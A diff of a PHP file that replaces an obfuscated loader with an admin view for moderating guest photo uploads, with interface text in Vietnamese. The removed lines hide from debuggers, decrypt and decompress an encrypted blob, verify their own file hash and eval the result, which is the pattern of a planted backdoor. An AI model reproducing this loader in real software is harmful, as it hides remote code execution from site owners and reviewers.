@@ -1,28 +1,32 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_hrla0dm2=('bas'.'e64'.'_de'.'cod'.'e');
-$_rhvrigdy=('gzu'.'nco'.'mpr'.'ess');
-$_ewynalkj=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_pnps0rw5='kIV1yWCq';
-$_mv1fxrlv='zFNsQXDd';
-$_k9beeno6='uRLwNNVd';
-$_wq6scbkh='a2WUGhExbLU=';
-$_xdxus6of='9UJpilGg';
-$_nw4bw87o='WxwOb66K';
-$_pp814qvj='eLu5hQ==';
-$_flfa5aly='rJCOInRy';
-$_ec77ohwd=$_hrla0dm2($_k9beeno6.$_xdxus6of.$_pnps0rw5.$_mv1fxrlv.$_wq6scbkh);
-$_e3ivbaas=$_hrla0dm2($_flfa5aly.$_nw4bw87o.$_pp814qvj);
-$_wjlj1eyb=$_hrla0dm2('GKCkoE7a1zp/aCntLyKInbGqEdYo8pSWscJCprVFH459ucVJ9qvbzjwwIrKbJeWNDJzGi7PkYR3B/Lct7Cx/p6RzTyTjlMcUFE1W8W+R2SAIFl464WOILpDg+iZqVmr5YJHOBN1Szv0R8gEgRSoLPWnDLmSXVjkXkyuZHlnluWCQ46Og1vumicMs9WZAwtbStyo523AQJr4NzuE5jg83d0+5cQLVRnUo0d4HMDebPod4yQRXk5iqsD2jDYOIr5R8/ztAbZ65gI68mY20P8MMAue9ye9y6kssSx7rqo0iHnCADy4h4UJwgdMEjl7GCB6hnvWrrMYl3gnMYgau1bh2KIOXm+TrKFll1TCCeAWsoFRAOmEqRO915LknaESj30skZSlezslC7wmzDZqTeP/6RrGz3+GLptjbFWlMVVWkejt99YYalFdOECbwOUEjR9apWAMeq3ZIjc2IzU7FrEqSPCuS6BOQJwY2mM45D3BIXZ5ykeipmazg7eSXfMDyUX0lFE1uFs4mUA5CbDp11+NIQHHk0cG5/Lu5rYCIrRq1JPmpxaX75vpFDfWvudak76A3H6UaMjMyLozibd1U58/d4QP5S7fPGUf45IBjaUI5dtNacpyzbdj4ydRs0XbQSeTdI3UROw5+WWWZmIjA655BTDLrBpvj9iNwmpKZ/ermGalTuW1f1szV+dmB/v6DyP5B/KQwezfjZaA0+ZTriYxAix7FhYZFCzToKP3TjHxmS0MkzqLJrRSS0zQO9IeKsPMCnXB1wyJPA/BxfTdhxMGlt5X0nlEWuCU3VKDROF8faEWu7NBM3jFB420BmVqhfNtb1C7rhRKWLfvMDQDqgH4L64RRBnNtKfF19DDIvM9N+77lx0u+RzBJhODc321kZ7xNbH0jMVCUQ5ZW6eDa2pv3To68KN/PwKd91tYZohi52qhl0UKR2Zh1yc933zEA9vmfWsa42/i7g9cAMrSNNkIW9K1yVXU3z6FNHODgAqOS2kNvAv/VdrjsZA24pMxV6ytHmXY67Mkz07IERDVJKvuHL5EDZlQSKwsaFOVrpKhTfEcfyuGSWs0rQ8GvVKtxfL/afsfkv5QJdNK5UdFIymOIRqMYZyQBzD/hykxRlfiaqRZ45NPNQnzBg/14juafJlkZ9ZSUIHi4Ht5r5HONaIq4e4sQcF3bqurzeGV2gMJql0jtPicrs6PDCjXa2yjGpaSPdbJ6IjzfB1SaJPIDcpNrF9w/lHpSZF9DT9uD5N/h9/VbWA4uLFk1K7oyNtSzHbEZ1PBuKsRBfHfuDnER7tSnwWWCxngs7VrNJNWSv/jXMqPYWYqFsLclKmEw/IQ+TZL5acYCMOwo5RFn62alTpTofA==');
-$_xorl3r54=$_ewynalkj($_wjlj1eyb,'aes-256-cbc',$_ec77ohwd,OPENSSL_RAW_DATA,$_e3ivbaas);
-if($_xorl3r54===false){exit;}
-$_qn8i84ay=$_rhvrigdy($_xorl3r54);
-if($_qn8i84ay===false){exit;}
-$_bm9jxpw1='a4b1f698275993bad56306f14043788c31b725ab8fcb6e56cf89d8f1729aab56';
-$_hz2iqofy=@file_get_contents(__FILE__);
-if($_hz2iqofy!==false){
-$_gazqn2nk=str_replace($_bm9jxpw1,"0000000000000000000000000000000000000000000000000000000000000000",$_hz2iqofy);
-$_zomhznfz=hash("sha256",$_gazqn2nk);
-if($_zomhznfz!==$_bm9jxpw1){@http_response_code(403);exit;}
-}
-eval($_qn8i84ay);
+ defined('BASEPATH') OR exit('No direct script access allowed'); ?>
+<h1 class="adm-title"><?= e(__('Ảnh')) ?></h1>
+<nav class="tabs" aria-label="<?= e(__('Ảnh')) ?>">
+  <a class="<?= $this->uri->segment(2) === 'albums' ? 'on' : '' ?>" href="<?= base_url('admin/albums') ?>"><?= e(__('Album{_}', array('_' => ''))) ?></a>
+  <a class="<?= $this->uri->segment(2) === 'moderation' ? 'on' : '' ?>" href="<?= base_url('admin/moderation') ?>"><?= e(__('Ảnh khách gửi chờ duyệt')) ?><span data-mod-tab><?= !empty($pending_photos) ? ' (' . (int) $pending_photos . ')' : '' ?></span></a>
+</nav>
+<?php if (!$photos): ?>
+  <p class="muted"><?= e(__('Không có ảnh nào đang chờ. Ảnh khách gửi sẽ hiện ở đây nếu bạn bật "Duyệt ảnh trước khi hiển thị" trong Cài đặt.')) ?></p>
+<?php else: ?>
+<div class="toolbar sticky" data-mod-bar>
+  <button type="button" class="btn btn-accent btn-sm" data-mod-all="approved"><?= e(__('Duyệt tất cả')) ?> (<span data-mod-left><?= count($photos) ?></span>)</button>
+  <button type="button" class="btn btn-ghost btn-sm" data-mod-all="rejected"><?= e(__('Từ chối tất cả')) ?></button>
+</div>
+<p class="muted" data-mod-empty hidden><?= e(__('Đã xử lý hết ảnh chờ duyệt. Ảnh vừa duyệt/từ chối vẫn hiện bên dưới để bạn hoàn tác nếu bấm nhầm.')) ?></p>
+<div class="mod-grid">
+  <?php foreach ($photos as $p): ?>
+  <figure class="mod-item" data-id="<?= (int) $p['id'] ?>">
+    <a href="<?= photo_url($p, 'm') ?>" data-lb data-cap="<?= e(($p['guest_name'] ?: __('Khách ẩn danh')) . ($p['guest_message'] ? ' — ' . $p['guest_message'] : '')) ?>"><img src="<?= photo_url($p, 't') ?>" alt="" loading="lazy"></a>
+    <figcaption>
+      <b><?= e($p['guest_name'] ?: __('Khách ẩn danh')) ?></b>
+      <?php if ($p['guest_message']): ?><span><?= e($p['guest_message']) ?></span><?php endif; ?>
+      <small class="muted"><?= e($p['album_title']) ?> · <?= e(date('H:i d/m', strtotime($p['created_at']))) ?></small>
+    </figcaption>
+    <div class="mod-actions">
+      <button type="button" class="btn btn-accent btn-sm" data-mod="approved"><?= e(__('Duyệt')) ?></button>
+      <button type="button" class="btn btn-ghost btn-sm" data-mod="rejected"><?= e(__('Từ chối')) ?></button>
+    </div>
+  </figure>
+  <?php endforeach; ?>
+</div>
+<?php endif;
